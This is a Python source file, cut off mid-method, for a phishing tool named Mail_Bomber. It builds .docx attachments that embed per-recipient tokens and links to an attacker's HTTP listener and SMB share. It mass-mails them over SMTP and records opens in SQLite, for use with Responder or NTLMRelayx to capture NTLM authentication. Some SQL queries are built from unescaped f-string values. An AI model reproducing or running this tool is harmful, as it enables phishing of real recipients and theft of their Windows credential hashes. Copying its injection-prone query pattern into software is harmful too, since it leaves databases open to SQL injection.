import os, re
import time
import numpy
import socket
import random
import string
import shutil
import logging
import smtplib
import sqlite3
import argparse
import tempfile
import mimetypes
import threading
import configparser
import multiprocessing
from time import sleep
from io import BytesIO
from pathlib import Path
from random import uniform
from pathlib import PurePath
from datetime import datetime
from zipfile import ZipFile, ZipInfo
from email.mime.text import MIMEText
from argparse import RawTextHelpFormatter
from urllib.parse import parse_qs, urlparse
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication

from colorama import init
init()
from colorama import Fore, Back, Style


CURRENT_DIR = Path().absolute()


class Helper:
    """
    Helper.
    _______________________________________________________________________________________________
    Вспомогательный класс, содержащий шаблоны регулярных выражений и некоторые статические методы.

    """

    @staticmethod
    def get_email_regex():
        email_regex = '''[a-zA-Z0-9._-]+@(([a-zA-Z0-9_-]{2,99}\.)+[a-zA-Z]{2,4})|((25[0-5]|2[0-4]\d|1\d\d|[1-9]\d|[1-9])\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]\d|[1-9])\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]\d|[1-9])\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]\d|[1-9]))'''
        return email_regex

    @staticmethod
    def get_ip_regex():
        ip_regex = '''^((?:(?:\d|[1-9]\d|1\d\d|2[0-4]\d|25[0-5])(?:\.(?!\:)|)){4})$'''
        return ip_regex

    @staticmethod
    def get_port_regex():
        port_regex = '''^([1-9][0-9]{0,3}|[1-5][0-9]{4}|6[0-4][0-9]{3}|65[0-4][0-9]{2}|655[0-2][0-9]|6553[0-5])$'''
        return port_regex

    @staticmethod
    def check_file_exist(path):
        result = os.path.isfile(path)
        return result

    @staticmethod
    def check_line_regex(regex, line):
        result = re.fullmatch(regex, line)
        if result:
            return True

        return False

    @staticmethod
    def print_error(line):
        error_msg = Fore.BLACK + Back.RED + Style.BRIGHT + 'Error' + Style.RESET_ALL + ': ' + line
        return error_msg

    @staticmethod
    def print_exception(line):
        exception_msg = Fore.BLACK + Back.RED + Style.BRIGHT + 'Exception' + Style.RESET_ALL + ': ' + line
        return exception_msg

    @staticmethod
    def print_warning(line):
        warning_msg = Fore.BLACK + Back.YELLOW + Style.BRIGHT + 'Warning' + Style.RESET_ALL + ': ' + line
        return warning_msg

    @staticmethod
    def print_info(line):
        info_msg = Fore.BLACK + Back.WHITE + Style.BRIGHT + 'Info' + Style.RESET_ALL + ': ' + line
        return info_msg

    @staticmethod
    def create_dir_if_not_exist(path):
        try:
            folder = PurePath(path)
            if not os.path.exists(folder):
                os.makedirs(folder)

        except Exception as e:
            error_msg = f'Ошибка при проверке на существование или создании директории: {path}.'
            exception_msg = f'{e}.'

            raise Exception(Helper.print_error(error_msg) + Helper.print_exception(exception_msg))


class ParserArguments:
    """
    ParserArguments.
    _______________________________________________________________________________________________
    Класс, предназначенный для обработки аргументов командной строки.

    """

    def __init__(self):
        self.parser = None

        self._create_arguments()
        self.arguments = self.parser.parse_args()

    @staticmethod
    def get_description():
        description_msg = '''
    Mail_Bomber - программа для осуществления почтовой рассылки специально подготовленных вложений формата .docx.
    Для осуществления захвата NTLM аутентификации необходимо дополнительно запустить Responder или Impacket-NTLMRelayx.
    '''
        return description_msg

    @staticmethod
    def get_usage():
        usage_msg =  '''
    Mail_Bomber.py [-h] [--attack_mode mode] [--emails_list FILE] [--output_dir PATH] [--config_file FILE] [--db_file FILE] [--dont_sent False] [--dont_listener False] [--dont_save True]
    '''
        return usage_msg

    @staticmethod
    def get_emails_list_default_path():
        emails_list_default_path = PurePath(CURRENT_DIR, 'emails_list.txt')
        return emails_list_default_path

    @staticmethod
    def get_config_file_default_path():
        config_file_default_path = PurePath(CURRENT_DIR, 'config.ini')
        return config_file_default_path

    @staticmethod
    def get_directory_for_save_payloads_default_path():
        directory_for_save_payloads_default_path = PurePath(CURRENT_DIR, 'Payloads')
        return directory_for_save_payloads_default_path

    @staticmethod
    def get_db_file_default_path():
        db_file_default_path = PurePath(CURRENT_DIR, 'result.db')
        return db_file_default_path

    def _create_arguments(self):
        self.parser = argparse.ArgumentParser(description=ParserArguments.get_description(),
                                         usage=ParserArguments.get_usage(),
                                         formatter_class=RawTextHelpFormatter)

        self.parser.add_argument('-a',
                            '--attack_mode',
                            dest='attack_mode',
                            help='''Режим запуска программы. По умолчанию: 2.
    Поддерживаемые значения 1 - 3.
    1 - Запуск в режиме генерации и отправки вложений по заданному списку почтовых адресов. Инициирует запуск сервера прослушивания.
    2 - Запуск сервера прослушивания.
    3 - Построение статистики по имеющимся в БД данным.''',
                            type=int,
                            choices=[1, 2, 3],
                            default=2)

        self.parser.add_argument('-e',
                            '--emails_list',
                            dest='emails_list',
                            help=f'Путь до файла со списком почтовых адресов. По умолчанию: {ParserArguments.get_emails_list_default_path()}.',
                            default=ParserArguments.get_emails_list_default_path())

        self.parser.add_argument('-c',
                            '--config_file',
                            dest='config_file',
                            help=f'Путь до файла конфигураций. По умолчанию: {ParserArguments.get_config_file_default_path()}.',
                            default=ParserArguments.get_config_file_default_path())

        self.parser.add_argument('-o',
                            '--output_dir',
                            dest='output_dir',
                            help=f'Путь до директории для сохранения сгенерированных почтовых вложений. По умолчанию: {ParserArguments.get_directory_for_save_payloads_default_path()}.',
                            default=ParserArguments.get_directory_for_save_payloads_default_path())

        self.parser.add_argument('--db_file',
                            dest='db_file',
                            help=f'Путь до файла БД SQLite, предназначенной для хранения результатов работы программы. По умолчанию: {ParserArguments.get_db_file_default_path()}.',
                            default=ParserArguments.get_db_file_default_path())

        self.parser.add_argument('--dont_sent',
                            dest='dont_sent',
                            help=f'Не проводить отправку подготовленных почтовых сообщений. Файлы вложения будут сохранены по умолчанию: {ParserArguments.get_directory_for_save_payloads_default_path()} или укажите директорию параметром --output_dir. По умолчанию: False.',
                            default='False',
                            choices=['True', 'False'])

        self.parser.add_argument('--dont_listener',
                            dest='dont_listener',
                            help=f'Не запускать сервер приема входящих соединений. По умолчанию: False.',
                            default='False',
                            choices=['True', 'False'])

        self.parser.add_argument('--dont_save',
                            dest='dont_save',
                            help=f'После отправки не сохранять файлы вложения. По умолчанию: True.',
                            default='True',
                            choices=['True', 'False'])


class ParserConfig:
    """
        ParserConfig.
        _______________________________________________________________________________________________
        Класс, предназначенный для обработки файла конфигурации.

    """

    def __init__(self, path_to_config):
        self.path_to_config = path_to_config
        self.config = None

        self._parse_file()

    @staticmethod
    def get_number_of_sections_in_config():
        number_of_sections_in_config = 6
        return number_of_sections_in_config

    def _parse_file(self):
        if not Helper.check_file_exist(self.path_to_config):
            error_msg = f'Ошибка чтения конфигурационного файла. Указанный файл не существует: {self.path_to_config}.'
            raise Exception(Helper.print_error(error_msg))

        try:
            self.config = configparser.ConfigParser()
            self.config.read(self.path_to_config)

            if not self._check_parameters():
                error_msg = f'Ошибка проверки параметров файла конфигурации: {self.path_to_config}.'
                raise Exception(Helper.print_error(error_msg))

        except Exception as e:
            error_msg = f'Ошибка при обработке файла конфигурации: {self.path_to_config}.'
            exception_msg = f'{e}'
            raise Exception(Helper.print_error(error_msg) + Helper.print_exception(exception_msg))

    def _check_parameters(self):
        check = True

        # проверка на количество секций в переданном на вход конфигурационном файле
        if len(self.config.sections()) != ParserConfig.get_number_of_sections_in_config():
            error_msg = f'Количество секций конфигурационного файла не удовлетворяет заявленному: {ParserConfig.get_number_of_sections_in_config()}.'
            print(Helper.print_error(error_msg))
            check = False

        # по каждому параметру из конфигурационного файла в отдельности
        try:
            sender_email = self.config['SENDER']['SENDER_EMAIL']
            if not Helper.check_line_regex(Helper.get_email_regex(), sender_email):
                error_msg = f'Введите корректный адрес отправителя: {sender_email}.'
                print(Helper.print_error(error_msg))
                check = False

            mail_server_ip = self.config['MAIL_SERVER']['MAIL_SERVER_IP']
            if not Helper.check_line_regex(Helper.get_ip_regex(), mail_server_ip):
                error_msg = f'Введите корректный IP-адрес почтового сервера: {mail_server_ip}.'
                print(Helper.print_error(error_msg))
                check = False

            mail_server_port = self.config['MAIL_SERVER']['MAIL_SERVER_PORT']
            if not Helper.check_line_regex(Helper.get_port_regex(), mail_server_port):
                error_msg = f'Введите корректный TCP-порт почтового сервера: {mail_server_port}.'
                print(Helper.print_error(error_msg))
                check = False

            http_listener_ip = self.config['HTTP_LISTENER']['HTTP_LISTENER_IP']
            if not Helper.check_line_regex(Helper.get_ip_regex(), http_listener_ip):
                error_msg = f'Введите корректный IP-адрес HTTP-слушателя: {http_listener_ip}.'
                print(Helper.print_error(error_msg))
                check = False

            http_listener_port = self.config['HTTP_LISTENER']['HTTP_LISTENER_PORT']
            if not Helper.check_line_regex(Helper.get_port_regex(), http_listener_port):
                error_msg = f'Введите корректный TCP-порт HTTP-слушателя: {http_listener_port}.'
                print(Helper.print_error(error_msg))
                check = False

            smb_listener_ip = self.config['SMB_LISTENER']['SMB_LISTENER_IP']
            if not Helper.check_line_regex(Helper.get_ip_regex(), smb_listener_ip):
                error_msg = f'Введите корректный IP-адрес SMB-слушателя: {smb_listener_ip}.'
                print(Helper.print_error(error_msg))
                check = False

            workspace_threads = self.config['WORKSPACE']['WORKSPACE_THREADS']
            if int(workspace_threads) < 1 or int(workspace_threads) > 16:
                error_msg = 'Количество потоков, переданное в конфигурационном файле параметром WORKSPACE_THREADS должно быть в диапазоне от 1 до 16.'
                print(Helper.print_error(error_msg))
                check = False

            workspace_template_filename = self.config['WORKSPACE']['WORKSPACE_TEMPLATE_FILENAME']
            workspace_result_filename = self.config['WORKSPACE']['WORKSPACE_PAYLOAD_FILENAME']
            workspace_report_filename = self.config['WORKSPACE']['WORKSPACE_REPORT_FILENAME']
            smb_listener_sharename = self.config['SMB_LISTENER']['SMB_LISTENER_SHARENAME']
            mail_server_username = self.config['MAIL_SERVER']['MAIL_SERVER_USERNAME']
            mail_server_password = self.config['MAIL_SERVER']['MAIL_SERVER_PASSWORD']
            workspace_name = self.config['WORKSPACE']['WORKSPACE_NAME']
            mail_subject = self.config['MAIL']['MAIL_SUBJECT']
            mail_data = self.config['MAIL']['MAIL_DATA']

            if not check:
                return False

            return True

        except KeyError as key:
            error_msg = f'В конфигурационном файле не найден один из ключей : {key}.'
            raise Exception(Helper.print_error(error_msg))


class Canary:
    """
        Canary.
        _______________________________________________________________________________________________
        Класс для работы с Canary токенами и создания файла вложения с заданными значениями.

    """

    def __init__(self, parser_config: ParserConfig):
        self.token = None
        self._url_replace = None
        self._smb_replace = None
        self._template_file_path = None

        self._config = parser_config.config

        self._create_token()
        self._create_url_replace()
        self._create_smb_replace()
        self._create_template_file_path()

    @staticmethod
    def get_canary_token_alphabet():
        canary_token_alphabet = string.ascii_lowercase + string.digits
        return canary_token_alphabet

    @staticmethod
    def get_canary_token_length():
        # equivalent to 128-bit id
        canary_token_length = 20
        return canary_token_length

    @staticmethod
    def get_mode_directory():
        mode_directory = 0x10
        return mode_directory

    @staticmethod
    def get_honeydrop_token_url():
        honeydrop_token_url = "HONEYDROP_TOKEN_URL"
        return honeydrop_token_url

    @staticmethod
    def get_honeydrop_token_smb():
        honeydrop_token_smb = "HONEYDROP_TOKEN_SMB"
        return honeydrop_token_smb

    @staticmethod
    def zipinfo_contents_replace(zip_file: ZipFile, zip_info: ZipInfo, search_url: str, replace_url: str, search_smb: str, replace_smb: str):
        temp_dir = tempfile.mkdtemp()
        file_name = zip_file.extract(zip_info, temp_dir)

        with open(file_name, "r", encoding="utf-8") as fd:
            contents = fd.read().replace(search_url, replace_url).replace(search_smb, replace_smb)
        shutil.rmtree(temp_dir)

        return contents

    def _create_token(self):
        self.token = "".join([random.choice(Canary.get_canary_token_alphabet()) for x in range(0, Canary.get_canary_token_length())], )

    def _create_url_replace(self):
        http_listener_ip = self._config['HTTP_LISTENER']['HTTP_LISTENER_IP']
        http_listener_port = self._config['HTTP_LISTENER']['HTTP_LISTENER_PORT']
        workspace_name = self._config['WORKSPACE']['WORKSPACE_NAME']

        self._url_replace = f'{http_listener_ip}:{http_listener_port}/{workspace_name}?token={self.token}'

    def _create_smb_replace(self):
        smb_listener_ip = self._config['SMB_LISTENER']['SMB_LISTENER_IP']
        smb_listener_sharename = self._config['SMB_LISTENER']['SMB_LISTENER_SHARENAME']

        self._smb_replace = f'{smb_listener_ip}\\{smb_listener_sharename}'

    def _create_template_file_path(self):
        template_common_filename = self._config['WORKSPACE']['WORKSPACE_TEMPLATE_FILENAME']
        template_filename = f'{template_common_filename}.docx'

        self._template_file_path = PurePath(CURRENT_DIR, template_filename)

        if not Helper.check_file_exist(self._template_file_path):
            error_msg = f'Шаблон файла >>> {template_filename} <<< по указанному пути >>> {self._template_file_path} <<< не существует.'
            raise Exception(Helper.print_error(error_msg))

    def make_canary_msword(self):
        with open(self._template_file_path, "rb") as f:
            input_buf = BytesIO(f.read())

        output_buf = BytesIO()
        output_zip = ZipFile(output_buf, "w")

        with ZipFile(input_buf, "r") as doc:
            for entry in doc.filelist:
                if entry.external_attr & Canary.get_mode_directory():
                    continue

                contents = Canary.zipinfo_contents_replace(zip_file=doc, zip_info=entry, search_url=Canary.get_honeydrop_token_url(), replace_url=self._url_replace, search_smb=Canary.get_honeydrop_token_smb(), replace_smb=self._smb_replace)

                output_zip.writestr(entry, contents)

        output_zip.close()

        return output_buf.getvalue()


class HtmlBuilder:
    """
        HtmlBuilder.
        _______________________________________________________________________________________________
        Класс для подготовки HTML-отчета по результатам работы программы Mail_Bomber.

    """

    bodyStr = ""
    style = """
<style>
#bomber {
    font-family:"Playfair Display", serif; font-weight:400;
    border-collapse: collapse;
    width: 100%;}

#bomber td, #bomber th {
    border: 1px solid #ddd;
    padding: 8px;
    text-align: center;}

#bomber tr:nth-child(even) {
    background-color: #f2f2f2;}

#bomber tr:hover { 
    background-color: #ddd;}

#bomber th {
    padding-top: 12px;
    padding-bottom: 12px;
    text-align: center;
    background-color: #49e6ff;
    color: black;}
	
h1 {
    position: relative;
    padding: 0;
    margin: 0;
    font-family: "Playfair Display", sans-serif;
    font-weight: 300;
    font-size: 40px;
    color: #080808;
    -webkit-transition: all 0.4s ease 0s;
    -o-transition: all 0.4s ease 0s;
    transition: all 0.4s ease 0s;}

h1 span {
    display: block;
    font-size: 0.5em;
    line-height: 1.3;}

h1 em {
    font-style: normal;
    font-weight: 600;}

body{
    background: #f8f8f8;}

.one h1 {
    text-align:center;
    text-transform:uppercase;
    font-size:26px; letter-spacing:1px;
    display: grid;
    grid-template-columns: 1fr auto 1fr;
    grid-template-rows: 16px 0;
    grid-gap: 22px;}

.one h1:after,.one h1:before {
    content: " ";
    display: block;
    border-bottom: 2px solid #121212;
    background-color:#f8f8f8;}

.two h1 {
    text-align:center; font-size:50px; text-transform:uppercase; color:#222; letter-spacing:1px;
    font-family:"Playfair Display", serif; font-weight:400;}
    
.two h1 span {
    margin-top: 5px;
    font-size:15px; color:#444; word-spacing:1px; font-weight:normal; letter-spacing:2px;
    text-transform: uppercase; font-family:"Raleway", sans-serif; font-weight:500; 
    display: grid;
    grid-template-columns: 1fr max-content 1fr;
    grid-template-rows: 27px 0;
    grid-gap: 20px;
    align-items: center;}

.two h1 span:after,.two h1 span:before {
    content: " ";
    display: block;
    border-bottom: 1px solid #ccc;
    border-top: 1px solid #ccc;
    height: 5px;
    background-color:#f8f8f8;}
</style>
"""

    def build_html_body_string(self, line):
        self.bodyStr += f'{line}\n'

    def get_html(self):
        html_string = (f"<!DOCTYPE html>\n"
                       f"<html>\n"
                       f"<head>\n"
                       f"{self.style}\n"
                       f"</head>\n"
                       f"<body>\n"
                       f"{self.bodyStr}\n"
                       f"</html>\n"
                       f"</body>\n")
        return html_string

    def add_table_to_html(self, data, headers: list):
        html = ("<table id='bomber'>\n"
                "<tr>\n")

        for header in headers:
            if header is not None:
                html += f'<th>{str(header)}</th>'
            else:
                html += '<th></th>'

        html += '</tr>\n'

        for line in data:
            html += '<tr>'

            for column in line:
                html += f'<td>{column}</td>'

            html += '</tr>\n'

        html += "</table>"

        self.build_html_body_string(html)

    def write_html_report(self, filename):
        f = open(os.path.join(CURRENT_DIR, filename), "w")
        f.write(self.get_html())
        f.close()

        return filename


class DBResults:
    """
        DBResults.
        _______________________________________________________________________________________________
        Класс для взаимодействия с базой данных SQLite (содержит результаты работы программы).

    """

    def __init__(self, path_to_db):
        self.path_to_db = path_to_db

        self.connector = None
        self.cursor = None

        self.create_db()

        self.db_free = True

    @staticmethod
    def get_sql_query_ct_sent_emails():
        create_table_sent_emails = '''CREATE TABLE IF NOT EXISTS SENT_EMAILS (
        WORKSPACE text,
        CANARY_TOKEN text,
        DATETIME_SENDING text,
        DESTINATION_EMAIL text)
        '''
        return create_table_sent_emails

    @staticmethod
    def get_sql_query_ct_dont_send_emails():
        create_table_dont_send_emails = '''CREATE TABLE IF NOT EXISTS DONT_SEND_EMAILS (
        WORKSPACE text,
        CANARY_TOKEN text,
        DATETIME_ATTEMPT text,
        DESTINATION_EMAIL text)'''
        return create_table_dont_send_emails

    @staticmethod
    def get_sql_query_ct_triggered():
        create_table_triggered = '''CREATE TABLE IF NOT EXISTS TRIGGERED (
        WORKSPACE text,
        CANARY_TOKEN text,
        SOURCE_IP text,
        DATETIME_OPENING text)'''
        return create_table_triggered

    @staticmethod
    def get_sql_query_ii_sent_emails():
        insert_into_sent_emails = (
            'INSERT INTO SENT_EMAILS (WORKSPACE, CANARY_TOKEN, DATETIME_SENDING, DESTINATION_EMAIL) VALUES (?, ?, ?, ?)')
        return insert_into_sent_emails

    @staticmethod
    def get_sql_query_ii_dont_send_emails():
        insert_into_dont_send_emails = (
            'INSERT INTO DONT_SEND_EMAILS (WORKSPACE, CANARY_TOKEN, DATETIME_ATTEMPT, DESTINATION_EMAIL) VALUES (?, ?, ?, ?)')
        return insert_into_dont_send_emails

    @staticmethod
    def get_sql_query_ii_triggered():
        insert_into_triggered = (
            'INSERT INTO TRIGGERED (WORKSPACE, CANARY_TOKEN, SOURCE_IP, DATETIME_OPENING) VALUES (?, ?, ?, ?)')
        return insert_into_triggered

    @staticmethod
    def get_sql_query_s_workspaces(table_name):
        select_workspaces = f'SELECT WORKSPACE FROM {table_name} GROUP BY WORKSPACE'
        return select_workspaces

    @staticmethod
    def get_sql_query_s_count_strings(table_name, workspace):
        select_count_strings = f"SELECT COUNT(WORKSPACE) AS WORKSPACES FROM {table_name} WHERE WORKSPACE='{workspace}'"
        return select_count_strings

    @staticmethod
    def get_sql_query_s_triggered(workspace):
        select_strings_in_triggered = f"SELECT CANARY_TOKEN, SOURCE_IP, DATETIME_OPENING FROM TRIGGERED WHERE WORKSPACE='{workspace}'"
        return select_strings_in_triggered

    @staticmethod
    def get_sql_query_s_sent_emails(canary_token):
        select_string_in_sent_emails = f"SELECT WORKSPACE, DATETIME_SENDING, DESTINATION_EMAIL FROM SENT_EMAILS WHERE CANARY_TOKEN='{canary_token}'"
        return select_string_in_sent_emails

    def create_db(self):
        if self._check_db_exist():
            warning_msg = f'База данных для сохранения результатов уже существует: {self.path_to_db}.'
            print(Helper.print_warning(warning_msg))

        if self.connector is None and self.cursor is None:
            if not self.open_connection():
                error_msg = f'Ошибка соединения с БД SQLite: {self.path_to_db}.'
                raise Exception(Helper.print_error(error_msg))

        self.execute_query(self.get_sql_query_ct_sent_emails())
        self.execute_query(self.get_sql_query_ct_dont_send_emails())
        self.execute_query(self.get_sql_query_ct_triggered())

        if not self.close_connection():
            error_msg = f'Ошибка закрытия соединения с БД SQLite: {self.path_to_db}.'
            raise Exception(Helper.print_error(error_msg))

    def _check_db_exist(self):
        result = os.path.isfile(self.path_to_db)
        return result

    def open_connection(self):
        try:
            if self.connector is not None and self.cursor is not None:
                warning_msg = f'Соединение с БД SQLite уже установлено: {self.path_to_db}.'
                print(Helper.print_warning(warning_msg))
                return False

            self.connector = sqlite3.connect(self.path_to_db)
            self.cursor = self.connector.cursor()
            return True

        except Exception as e:
            error_msg = f'Ошибка соединения с БД SQLite: {self.path_to_db}.'
            exception_msg = f'{e}.'
            raise Exception(Helper.print_error(error_msg) + Helper.print_exception(exception_msg))

    def close_connection(self):
        try:
            if self.connector is None and self.cursor is None:
                warning_msg = f'Соединение с БД SQLite уже закрыто: {self.path_to_db}.'
                print(Helper.print_warning(warning_msg))
                return True

            self.cursor.close()
            self.cursor = None

            self.connector.close()
            self.connector = None

            return True

        except Exception as e:
            error_msg = f'Ошибка закрытия соединения с БД SQLite: {self.path_to_db}.'
            exception_msg = f'{e}.'
            raise Exception(Helper.print_error(error_msg) + Helper.print_exception(exception_msg))

    def execute_query(self, query, data=False):
        try:
            if self.connector is None and self.cursor is None:
                error_msg = f'Error: Ошибка выполнения запроса к БД SQLite: >>> {query} <<< с параметрами: >>> {data} <<<.'
                raise Exception(Helper.print_error(error_msg))

            if not data:
                self.cursor.execute(query)
            else:
                self.cursor.execute(query, data)

            rows = self.cursor.fetchall()
            results = [list(row) for row in rows]

            self.connector.commit()
            return results

        except Exception as e:
            error_msg = f'Ошибка выполнения запроса к БД SQLite: >>> {query} <<< с параметрами: >>> {data} <<<.'
            exception_msg = f'{e}.'
            raise Exception(Helper.print_error(error_msg) + Helper.print_exception(exception_msg))

    def get_all_workspaces_in_db(self):
        all_workspaces = []

        self.open_connection()

        workspaces_in_sent_emails = self.execute_query(DBResults.get_sql_query_s_workspaces('SENT_EMAILS'))
        workspaces_in_dont_send_emails = self.execute_query(DBResults.get_sql_query_s_workspaces('DONT_SEND_EMAILS'))
        workspaces_in_triggered = self.execute_query(DBResults.get_sql_query_s_workspaces('TRIGGERED'))

        self.close_connection()

        for item in workspaces_in_sent_emails:
            for workspace in item:
                all_workspaces.append(workspace)

        for item in workspaces_in_dont_send_emails:
            for workspace in item:
                all_workspaces.append(workspace)

        for item in workspaces_in_triggered:
            for workspace in item:
                all_workspaces.append(workspace)

        all_workspaces = list(dict.fromkeys(all_workspaces))
        all_workspaces.sort()

        return all_workspaces

    def get_statistics_in_db(self, workspaces):
        statistics = {}

        for workspace in workspaces:
            statistics[workspace] = {}

            self.open_connection()
            statistics[workspace]['sent_emails'] = self.execute_query(DBResults.get_sql_query_s_count_strings('SENT_EMAILS', workspace))[0][0]
            statistics[workspace]['dont_send_emails'] = self.execute_query(DBResults.get_sql_query_s_count_strings('DONT_SEND_EMAILS', workspace))[0][0]
            statistics[workspace]['triggered'] = self.execute_query(DBResults.get_sql_query_s_count_strings('TRIGGERED', workspace))[0][0]
            self.close_connection()

        return statistics

    def get_strings_in_triggered(self, workspaces):
        strings_in_triggered_identified = []
        strings_in_triggered_dont_identified = []

        current_string_id = 0

        for workspace in workspaces:

            self.open_connection()
            strings_in_triggered = self.execute_query(DBResults.get_sql_query_s_triggered(workspace))
            self.close_connection()

            for line in strings_in_triggered:

                self.open_connection()
                string_in_sent_emails = self.execute_query(DBResults.get_sql_query_s_sent_emails(line[0]))
                self.close_connection()

                if len(string_in_sent_emails) > 0:
                    time_interval = datetime.strptime(line[2], "%d/%m/%Y, %H:%M:%S") - datetime.strptime(string_in_sent_emails[0][1], "%d/%m/%Y, %H:%M:%S")

                    data = [workspace, string_in_sent_emails[0][2], line[1], string_in_sent_emails[0][1], f'{line[2]} ({time_interval})', line[0]]
                    strings_in_triggered_identified.append(data)
                else:
                    data = [workspace, line[1], line[2], line[0]]
                    strings_in_triggered_dont_identified.append(data)

                current_string_id += 1

        return strings_in_triggered_identified, strings_in_triggered_dont_identified


class Mailer:
    """
        Mailer.
        _______________________________________________________________________________________________
        Класс для отправки почтовых сообщений с предварительной проверкой списка почтовых адресантов (по регулярным выражениям).

    """

    def __init__(self, parser_arguments: ParserArguments, parser_config: ParserConfig, database: DBResults):
        self.bad_emails = []
        self.emails_to_send = []

        self._satisfies_regex = []
        self._not_satisfies_regex = []

        self.emails_file_path = parser_arguments.arguments.emails_list

        self._parse_emails_file()

        self.workspace = parser_config.config['WORKSPACE']['WORKSPACE_NAME']

        self.sender_email = parser_config.config['SENDER']['SENDER_EMAIL']
        self.subject = parser_config.config['MAIL']['MAIL_SUBJECT']
        self.message = parser_config.config['MAIL']['MAIL_DATA']

        self.smtp_ip = parser_config.config['MAIL_SERVER']['MAIL_SERVER_IP']
        self.smtp_port = parser_config.config['MAIL_SERVER']['MAIL_SERVER_PORT']
        self.smtp_username = parser_config.config['MAIL_SERVER']['MAIL_SERVER_USERNAME']
        self.smtp_password = parser_config.config['MAIL_SERVER']['MAIL_SERVER_PASSWORD']

        self._database = database

    @staticmethod
    def _sort_and_remove_duplicates_from_list(current_list):
        result = list(dict.fromkeys(current_list))
        result.sort()

        return result

    def _read_emails_file(self):
        if not Helper.check_file_exist(self.emails_file_path):
            error_msg = f'Ошибка чтения файла. Указанный файл не существует: {self.emails_file_path}.'
            raise Exception(Helper.print_error(error_msg))

        file = open(self.emails_file_path, 'r')
        for line in file:
            line = line.replace('\n', '').replace('\r', '').replace('\t', '')
            if Helper.check_line_regex(Helper.get_email_regex(), line):
                self._satisfies_regex.append(line)
                continue

            warning_msg = f'Почтовый адрес >>> {line} <<< не удовлетворяет регулярному выражению.'
            print(Helper.print_warning(warning_msg))

            self._not_satisfies_regex.append(line)

    def _parse_emails_file(self):
        try:
            self._read_emails_file()

        except Exception as e:
            error_msg = f'Ошибка чтения файла почтовых адресов: {self.emails_file_path}.'
            exception_msg = f'{e}.'
            raise Exception(Helper.print_error(error_msg) + Helper.print_exception(exception_msg))

        try:
            self.emails_to_send = self._sort_and_remove_duplicates_from_list(self._satisfies_regex)
            self.bad_emails = self._sort_and_remove_duplicates_from_list(self._not_satisfies_regex)

        except Exception as e:
            error_msg = 'Ошибка сортировки и удаления дубликатов при формировании списка почтовых адресов для отправки.'
            exception_msg = f'{e}.'
            raise Exception(Helper.print_error(error_msg) + Helper.print_exception(exception_msg))

    def _create_mail(self, recipient_email, path_to_payload):
        mail_msg = MIMEMultipart()

        mail_msg['From'] = self.sender_email
        mail_msg['To'] = recipient_email
        mail_msg['Subject'] = self.subject
        mail_msg.attach(MIMEText(self.message, 'plain'))

        try:
            mime_type, _ = mimetypes.guess_type(path_to_payload)

            if mime_type is None:
                mime_type = "application/octet-stream"

        except Exception as e:
            error_msg = f'Ошибка определения MIME-type файла вложения: {path_to_payload}.'
            exception_msg = f'{e}.'
            raise Exception(Helper.print_error(error_msg) + Helper.print_exception(exception_msg))

        try:
            file_name = os.path.basename(path_to_payload)

        except Exception as e:
            error_msg = f'Ошибка определения имени файла вложения: {path_to_payload}.'
            exception_msg = f'{e}.'
            raise Exception(Helper.print_error(error_msg) + Helper.print_exception(exception_msg))

        try:
            with open(path_to_payload, 'rb') as payload_file:
                part = MIMEApplication(payload_file.read(), _subtype=mime_type)
                part.add_header('Content-Disposition', f'attachment; filename="' + file_name + '"')
                mail_msg.attach(part)

        except Exception as e:
            error_msg = f'Ошибка чтения файла вложения: {path_to_payload}.'
            exception_msg = f'{e}.'
            raise Exception(Helper.print_error(error_msg) + Helper.print_exception(exception_msg))

        return mail_msg

    def _write_results(self, query, data):

        while not self._database.db_free:
            sleep(uniform(0.2, 0.5))
            continue

        self._database.db_free = False
        self._database.open_connection()

        self._database.execute_query(query, data=data)

        self._database.close_connection()
        self._database.db_free = True

    def send_mail(self, canary_token, recipient_email, path_to_payload):
        try:
            mail_msg = self._create_mail(recipient_email, path_to_payload)

            if not mail_msg:
                error_msg = f'Ошибка создания почтового сообщения с параметрами: получатель >>> {recipient_email} <<<, путь к файлу вложения >>> {path_to_payload} <<<.'
                print(Helper.print_error(error_msg))
                return

        except Exception as e:
            exception_msg = f'{e}.'
            print(Helper.print_exception(exception_msg))
            return

        try:
            smtp_server = smtplib.SMTP(self.smtp_ip, self.smtp_port)

            ehlo_response = smtp_server.ehlo()
            tls_supported = b'STARTTLS' in ehlo_response[1]

            if tls_supported:
                smtp_server.starttls()
                smtp_server.ehlo()

            if self.smtp_username and self.smtp_password:
                try:
                    smtp_server.login(self.smtp_username, self.smtp_password)

                except smtplib.SMTPNotSupportedError:
                    warning_msg = 'SMTP AUTH не поддерживается почтовым сервером. Отправка без аутентификации.'
                    print(Helper.print_warning(warning_msg))

            smtp_server.sendmail(self.sender_email, recipient_email, mail_msg.as_string())
            smtp_server.quit()

            datetime_now = datetime.now()
            datetime_sending = datetime_now.strftime("%d/%m/%Y, %H:%M:%S")
            data = (self.workspace, canary_token, datetime_sending, recipient_email)
            self._write_results(self._database.get_sql_query_ii_sent_emails(), data)

        except Exception as e:
            datetime_now = datetime.now()
            datetime_sending = datetime_now.strftime("%d/%m/%Y, %H:%M:%S")
            data = (self.workspace, canary_token, datetime_sending, recipient_email)
            self._write_results(self._database.get_sql_query_ii_dont_send_emails(), data)

            warning_msg = f'Ошибка отправки почтового сообщения с параметрами: получатель >>> {recipient_email} <<<, путь к файлу вложения >>> {path_to_payload} <<<.'
            print(Helper.print_warning(warning_msg))

            return False

        return True


class Listener:
    """
        Listener.
        _______________________________________________________________________________________________
        Класс, реализующий обработку входящих запросов, возникающих в результате открытия почтовых вложений.

    """

    def __init__(self, parser_config: ParserConfig, database: DBResults):

        self._host = parser_config.config['HTTP_LISTENER']['HTTP_LISTENER_IP']
        self._port = int(parser_config.config['HTTP_LISTENER']['HTTP_LISTENER_PORT'])
        self.server_socket = None
        self._database = database

    @staticmethod
    def get_max_line_length():
        max_line_length = 64 * 1024
        return max_line_length

    @staticmethod
    def get_number_of_parts_in_target_request():
        # for example: http://127.0.0.1/company - 2 part ('/', 'company')
        number_of_parts_in_target_request = 2
        return number_of_parts_in_target_request

    @staticmethod
    def get_number_of_parameters_in_request():
        # we accept only one GET parameter in the request
        number_of_parameters_in_request = 1
        return number_of_parameters_in_request

    @staticmethod
    def get_number_of_values_in_parameter():
        # we accept only one value in GET parameter in the request
        number_of_values_in_parameter = 1
        return number_of_values_in_parameter

    @staticmethod
    def get_position_after_slash():
